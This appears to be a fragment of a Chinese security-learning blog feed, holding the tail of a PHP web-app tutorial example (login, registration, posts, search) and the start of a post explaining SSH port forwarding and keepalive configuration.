class="string">&#x27;hasPrevPage&#x27;</span> =&gt; <span class="variable">$page</span> &gt; <span class="number">1</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showLoginForm</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$error</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_error&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login_error&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">render</span>(<span class="string">&#x27;login&#x27;</span>, [</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span> =&gt; <span class="string">&#x27;Login&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="variable">$error</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">processLogin</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$email</span> = <span class="title class_">Utils</span>::<span class="title function_ invoke__">sanitizeInput</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$user</span> = <span class="title class_">User</span>::<span class="title function_ invoke__">authenticate</span>(<span class="variable">$email</span>, <span class="variable">$password</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$user</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] = <span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$user</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="title class_">Utils</span>::<span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_error&#x27;</span>] = <span class="string">&quot;Invalid email or password&quot;</span>;</span><br><span class="line">        <span class="title class_">Utils</span>::<span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showRegistrationForm</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$errors</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;registration_errors&#x27;</span>] ?? [];</span><br><span class="line">    <span class="variable">$formData</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;form_data&#x27;</span>] ?? [];</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;registration_errors&#x27;</span>], <span class="variable">$_SESSION</span>[<span class="string">&#x27;form_data&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">render</span>(<span class="string">&#x27;register&#x27;</span>, [</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span> =&gt; <span class="string">&#x27;Register&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;errors&#x27;</span> =&gt; <span class="variable">$errors</span>,</span><br><span class="line">        <span class="string">&#x27;formData&#x27;</span> =&gt; <span class="variable">$formData</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">processRegistration</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title class_">Utils</span>::<span class="title function_ invoke__">sanitizeInput</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="variable">$email</span> = <span class="title class_">Utils</span>::<span class="title function_ invoke__">sanitizeInput</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$confirmPassword</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;confirm_password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$errors</span> = [];</span><br><span class="line">    <span class="variable">$formData</span> = [</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> =&gt; <span class="variable">$name</span>,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span> =&gt; <span class="variable">$email</span></span><br><span class="line">    ];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="variable">$errors</span>[] = <span class="string">&quot;Name is required&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$email</span>)) &#123;</span><br><span class="line">        <span class="variable">$errors</span>[] = <span class="string">&quot;Email is required&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$email</span>, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">        <span class="variable">$errors</span>[] = <span class="string">&quot;Invalid email format&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">        <span class="variable">$errors</span>[] = <span class="string">&quot;Password is required&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &lt; <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="variable">$errors</span>[] = <span class="string">&quot;Password must be at least 8 characters&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$password</span> !== <span class="variable">$confirmPassword</span>) &#123;</span><br><span class="line">        <span class="variable">$errors</span>[] = <span class="string">&quot;Passwords do not match&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$errors</span>)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$name</span>, <span class="variable">$email</span>, <span class="variable">$password</span>);</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">            <span class="title class_">Utils</span>::<span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="variable">$errors</span>[] = <span class="string">&quot;Registration failed: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;registration_errors&#x27;</span>] = <span class="variable">$errors</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;form_data&#x27;</span>] = <span class="variable">$formData</span>;</span><br><span class="line">    <span class="title class_">Utils</span>::<span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/register&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showPost</span>(<span class="params"><span class="variable">$id</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$post</span> = <span class="title class_">Post</span>::<span class="title function_ invoke__">getById</span>(<span class="variable">$id</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$post</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">show404</span>();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用静态缓存获取作者</span></span><br><span class="line">    <span class="variable">$author</span> = <span class="title class_">Utils</span>::<span class="title function_ invoke__">cached</span>(<span class="string">&quot;user_<span class="subst">&#123;$post[&#x27;author_id&#x27;]&#125;</span>&quot;</span>, function() <span class="keyword">use</span> ($<span class="title">post</span>) &#123;</span><br><span class="line">        <span class="title">return</span> <span class="title">User</span>::<span class="title">getById</span>($<span class="title">post</span>[&#x27;<span class="title">author_id</span>&#x27;]);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">render</span>(<span class="string">&#x27;post&#x27;</span>, [</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span> =&gt; <span class="variable">$post</span>[<span class="string">&#x27;title&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;post&#x27;</span> =&gt; <span class="variable">$post</span>,</span><br><span class="line">        <span class="string">&#x27;author&#x27;</span> =&gt; <span class="variable">$author</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showCreateForm</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title class_">Utils</span>::<span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$errors</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;post_errors&#x27;</span>] ?? [];</span><br><span class="line">    <span class="variable">$formData</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;post_data&#x27;</span>] ?? [];</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;post_errors&#x27;</span>], <span class="variable">$_SESSION</span>[<span class="string">&#x27;post_data&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">render</span>(<span class="string">&#x27;create&#x27;</span>, [</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span> =&gt; <span class="string">&#x27;Create New Post&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;errors&#x27;</span> =&gt; <span class="variable">$errors</span>,</span><br><span class="line">        <span class="string">&#x27;formData&#x27;</span> =&gt; <span class="variable">$formData</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">processCreatePost</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title class_">Utils</span>::<span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$title</span> = <span class="title class_">Utils</span>::<span class="title function_ invoke__">sanitizeInput</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$errors</span> = [];</span><br><span class="line">    <span class="variable">$formData</span> = [</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span> =&gt; <span class="variable">$title</span>,</span><br><span class="line">        <span class="string">&#x27;content&#x27;</span> =&gt; <span class="variable">$content</span></span><br><span class="line">    ];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$title</span>)) &#123;</span><br><span class="line">        <span class="variable">$errors</span>[] = <span class="string">&quot;Title is required&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$content</span>)) &#123;</span><br><span class="line">        <span class="variable">$errors</span>[] = <span class="string">&quot;Content is required&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$errors</span>)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$post</span> = <span class="keyword">new</span> <span class="title class_">Post</span>(<span class="variable">$title</span>, <span class="variable">$content</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">            <span class="variable">$post</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">            <span class="title class_">Utils</span>::<span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="variable">$errors</span>[] = <span class="string">&quot;Error creating post: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;post_errors&#x27;</span>] = <span class="variable">$errors</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;post_data&#x27;</span>] = <span class="variable">$formData</span>;</span><br><span class="line">    <span class="title class_">Utils</span>::<span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/create&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showSearchResults</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$query</span> = <span class="title class_">Utils</span>::<span class="title function_ invoke__">sanitizeInput</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$query</span>)) &#123;</span><br><span class="line">        <span class="title class_">Utils</span>::<span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 缓存搜索结果</span></span><br><span class="line">    <span class="variable">$searchResults</span> = <span class="title class_">Utils</span>::<span class="title function_ invoke__">cached</span>(<span class="string">&quot;search_<span class="subst">$query</span>&quot;</span>, function() <span class="keyword">use</span> ($<span class="title">query</span>) &#123;</span><br><span class="line">        <span class="title">return</span> <span class="title">Post</span>::<span class="title">search</span>($<span class="title">query</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">render</span>(<span class="string">&#x27;search&#x27;</span>, [</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span> =&gt; <span class="string">&quot;Search Results for &#x27;<span class="subst">$query</span>&#x27;&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;query&#x27;</span> =&gt; <span class="variable">$query</span>,</span><br><span class="line">        <span class="string">&#x27;results&#x27;</span> =&gt; <span class="variable">$searchResults</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">processLogout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">    <span class="title class_">Utils</span>::<span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show404</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">404</span>);</span><br><span class="line">    <span class="title function_ invoke__">render</span>(<span class="string">&#x27;404&#x27;</span>, [<span class="string">&#x27;title&#x27;</span> =&gt; <span class="string">&#x27;Page Not Found&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 9. 初始化</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 10. 创建数据库表（如果不存在）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initializeDatabase</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$db</span> = <span class="title class_">Database</span>::<span class="title function_ invoke__">getInstance</span>()-&gt;<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建用户表</span></span><br><span class="line">    <span class="variable">$createUsersTable</span> = <span class="string">&quot;CREATE TABLE IF NOT EXISTS users (</span></span><br><span class="line"><span class="string">        id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,</span></span><br><span class="line"><span class="string">        name VARCHAR(50) NOT NULL,</span></span><br><span class="line"><span class="string">        email VARCHAR(100) NOT NULL UNIQUE,</span></span><br><span class="line"><span class="string">        password VARCHAR(255) NOT NULL,</span></span><br><span class="line"><span class="string">        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP</span></span><br><span class="line"><span class="string">    )&quot;</span>;</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$createUsersTable</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建文章表</span></span><br><span class="line">    <span class="variable">$createPostsTable</span> = <span class="string">&quot;CREATE TABLE IF NOT EXISTS posts (</span></span><br><span class="line"><span class="string">        id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,</span></span><br><span class="line"><span class="string">        title VARCHAR(255) NOT NULL,</span></span><br><span class="line"><span class="string">        content TEXT NOT NULL,</span></span><br><span class="line"><span class="string">        author_id INT(6) UNSIGNED NOT NULL,</span></span><br><span class="line"><span class="string">        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,</span></span><br><span class="line"><span class="string">        FOREIGN KEY (author_id) REFERENCES users(id) ON DELETE CASCADE</span></span><br><span class="line"><span class="string">    )&quot;</span>;</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$createPostsTable</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 11. 启动应用</span></span><br><span class="line"><span class="title function_ invoke__">initializeDatabase</span>();</span><br><span class="line"><span class="title function_ invoke__">handleRequest</span>();</span><br></pre></td></tr></table></figure>

<h3 id="这个综合示例展示了："><a href="#这个综合示例展示了：" class="headerlink" title="这个综合示例展示了："></a>这个综合示例展示了：</h3><ul>
<li><strong>命名空间和类组织</strong>：使用命名空间组织代码，提高可维护性</li>
<li><strong>静态方法和成员</strong>：使用静态方法实现工具类、单例模式和缓存</li>
<li><strong>数据库连接和操作</strong>：使用PDO实现安全的数据库操作</li>
<li><strong>用户认证和会话管理</strong>：实现登录、注册和会话管理</li>
<li><strong>表单处理和验证</strong>：验证用户输入，处理表单错误</li>
<li><strong>路由和控制器逻辑</strong>：基于URL和HTTP方法处理请求</li>
<li><strong>视图渲染</strong>：分离业务逻辑和展示逻辑</li>
<li><strong>错误处理</strong>：捕获和处理异常，提供友好的错误页面</li>
<li><strong>安全措施</strong>：输入清理、密码哈希、防止SQL注入</li>
<li><strong>缓存机制</strong>：使用静态属性实现简单的缓存</li>
<li><strong>分页功能</strong>：实现文章分页显示</li>
<li><strong>搜索功能</strong>：实现全文搜索</li>
<li><strong>单例模式</strong>：使用静态实例确保数据库连接唯一性</li>
<li><strong>静态工具类</strong>：提供各种工具方法，如输入清理、重定向等</li>
<li><strong>对象关系映射</strong>：将数据库记录映射为对象</li>
<li><strong>事务处理</strong>：确保数据一致性</li>
<li><strong>代码复用</strong>：使用静态方法减少代码重复</li>
</ul>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>Web</category>
        <category>前端&amp;后端基础</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>SSH隧道技术</title>
    <url>/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h2 id="1-什么是SSH隧道-为什么需要SSH隧道？"><a href="#1-什么是SSH隧道-为什么需要SSH隧道？" class="headerlink" title="1.什么是SSH隧道+为什么需要SSH隧道？"></a><code>1.什么是SSH隧道+为什么需要SSH隧道？</code></h2><blockquote>
<p>SSH 隧道就像是一条加密的地下通道，让你在不安全的网络上安全地传输数据。<br>比如：你想从家里访问公司内网的数据库，但数据库只能在公司内网访问，这时候 SSH 隧道就能帮你 “穿墙” 访问。</p>
</blockquote>
<h2 id="2-SSH的隧道类型"><a href="#2-SSH的隧道类型" class="headerlink" title="2.SSH的隧道类型"></a><code>2.SSH的隧道类型</code></h2><h3 id="SSH反向连接（远程端口转发）"><a href="#SSH反向连接（远程端口转发）" class="headerlink" title="SSH反向连接（远程端口转发）"></a><code>SSH反向连接</code>（远程端口转发）</h3><img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_1.png" class="" title="在这里插入图片描述">
<p>  因此可以通过访问内网2来访问内网1的主机（因为内网2是允许外网主机访问的）</p>
<img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_2.png" class="" title="在这里插入图片描述">

<img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_3.png" class="" title="在这里插入图片描述">

<img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_4.png" class="" title="在这里插入图片描述">

<blockquote>
<p>如果此时就是想访问server 1 可以修改命令为 ssh -L 80:127.0.0.1 用户@server1_ip</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ssh反向连接命令格式</span></span><br><span class="line">ssh <span class="literal">-R</span> 远程主机监听端口:本地主机地址:本地服务端口 用户名<span class="selector-tag">@</span>远程服务器地址</span><br></pre></td></tr></table></figure>

<h3 id="SSH正向连接（本地端口转发）"><a href="#SSH正向连接（本地端口转发）" class="headerlink" title="SSH正向连接（本地端口转发）"></a><code>SSH正向连接</code>（本地端口转发）</h3><img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_5.png" class="" title="在这里插入图片描述">
<img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_6.png" class="" title="在这里插入图片描述">
<img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_7.png" class="" title="在这里插入图片描述">


<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#指令格式</span></span><br><span class="line">ssh <span class="literal">-L</span> 本地端口:内网目标IP:内网目标端口 SSH服务器用户名@SSH服务器IP</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="ssh动态连接（动态端口转发）"><a href="#ssh动态连接（动态端口转发）" class="headerlink" title="ssh动态连接（动态端口转发）"></a><code>ssh动态连接</code>（动态端口转发）</h3><img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_8.png" class="" title="在这里插入图片描述">

<hr>
<h2 id="3-SSH的密钥"><a href="#3-SSH的密钥" class="headerlink" title="3.SSH的密钥"></a><code>3.SSH的密钥</code></h2><img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_9.png" class="" title="在这里插入图片描述">
<blockquote>
<p>ssh最重要是第一次连接，这是漏洞的所在点</p>
</blockquote>
<hr>
<h2 id="4-SSH的维持连接"><a href="#4-SSH的维持连接" class="headerlink" title="4.SSH的维持连接"></a><code>4.SSH的维持连接</code></h2><h3 id="断开原因："><a href="#断开原因：" class="headerlink" title="断开原因："></a>断开原因：</h3><h4 id="网络层面的中断因素"><a href="#网络层面的中断因素" class="headerlink" title="网络层面的中断因素"></a><code>网络层面的中断因素</code></h4><ul>
<li><strong>底层网络波动</strong>：Wi-Fi信号弱、移动网络切换、路由器故障或带宽不足，导致TCP连接超时。  </li>
<li><strong>防火墙&#x2F;NAT超时机制</strong>：企业网络防火墙或家用路由器设置连接超时时间（如无数据传输时），主动断开“非活跃连接”。  </li>
<li><strong>NAT穿透失效</strong>：内网通过NAT访问公网时，映射表项超时（如30分钟），导致公网无法识别连接。</li>
</ul>
<h4 id="设备与资源限制"><a href="#设备与资源限制" class="headerlink" title="设备与资源限制"></a><code>设备与资源限制</code></h4><ul>
<li><strong>服务器负载过高</strong>：CPU、内存不足或进程异常，导致SSH服务进程被系统终止。  </li>
<li><strong>客户端异常</strong>：设备休眠、电源中断、SSH客户端程序崩溃或网络接口断开（如拔网线）。</li>
</ul>
<h4 id="连接状态与配置问题"><a href="#连接状态与配置问题" class="headerlink" title="连接状态与配置问题"></a><code>连接状态与配置问题</code></h4><ul>
<li><strong>心跳包机制未启用</strong>：未配置<code>ServerAliveInterval</code>等参数，无法通过心跳包维持连接活跃状态，被中间设备断开。  </li>
<li><strong>配置参数不合理</strong>：如<code>ClientAliveCountMax</code>设置过小，导致轻微网络延迟即触发断连。</li>
</ul>
<h4 id="安全策略与异常行为"><a href="#安全策略与异常行为" class="headerlink" title="安全策略与异常行为"></a><code>安全策略与异常行为</code></h4><ul>
<li><strong>账号锁定或认证失败</strong>：多次密码输入错误触发安全策略，账户被锁定或IP被封禁。  </li>
<li><strong>会话残留或异常终止</strong>：连接断开时未正常释放资源，残留进程可能导致后续连接冲突。</li>
</ul>
<h4 id="其他偶发因素"><a href="#其他偶发因素" class="headerlink" title="其他偶发因素"></a><code>其他偶发因素</code></h4><ul>
<li><strong>跨时区或时钟同步问题</strong>：服务器与客户端时钟偏差过大，导致TCP校验失败。  </li>
<li><strong>网络攻击或干扰</strong>：DDoS攻击、中间人攻击等破坏TCP连接的完整性。</li>
</ul>
<h3 id="维持连接："><a href="#维持连接：" class="headerlink" title="维持连接："></a>维持连接：</h3><h4 id="1-网络环境优化"><a href="#1-网络环境优化" class="headerlink" title="1.网络环境优化"></a><code>1.网络环境优化</code></h4><ol>
<li><p><strong>物理网络稳定性</strong>  </p>
<ul>
<li>使用有线网络替代Wi-Fi，或选择信号强的5GHz频段，减少波动。  </li>
<li>避免多层NAT环境（如家庭路由器+企业VPN），降低连接跳数。</li>
</ul>
</li>
<li><p><strong>防火墙与NAT配置</strong>  </p>
<ul>
<li>调整防火墙规则，允许SSH流量通过（通常为TCP 22端口），并延长连接超时时间（如30分钟）。  </li>
<li>配置NAT设备的静态端口映射，确保SSH连接的稳定性。</li>
</ul>
</li>
</ol>
<h4 id="2-SSH连接参数调整"><a href="#2-SSH连接参数调整" class="headerlink" title="2.SSH连接参数调整"></a><code>2.SSH连接参数调整</code></h4><ol>
<li><p><strong>客户端配置（<code>~/.ssh/config</code>）-Linux系统</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Host *</span><br><span class="line">    ServerAliveInterval 30    <span class="comment"># 每30秒发送心跳包</span></span><br><span class="line">    ServerAliveCountMax 10    <span class="comment"># 连续10次无响应才断开</span></span><br><span class="line">    TCPKeepAlive <span class="built_in">yes</span>          <span class="comment"># 启用TCP级心跳</span></span><br><span class="line">    ControlMaster auto        <span class="comment"># 启用连接复用</span></span><br><span class="line">    ControlPath ~/.ssh/socket-%r@%h:%p</span><br><span class="line">    ControlPersist 1h         <span class="comment"># 主连接保持1小时</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>服务器配置（<code>/etc/ssh/sshd_config</code>）-Linux系统</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ClientAliveInterval 60        <span class="comment"># 服务器主动检测客户端的间隔</span></span><br><span class="line">ClientAliveCountMax 3         <span class="comment"># 允许的无响应次数</span></span><br></pre></td></tr></table></figure>
<p>配置后重启SSH服务：<code>sudo systemctl restart sshd</code>。</p>
</li>
</ol>
<p>SSH 客户端如何发现并使用配置文件？</p>
<ol>
<li><p><strong>自动查找机制</strong>：</p>
<ul>
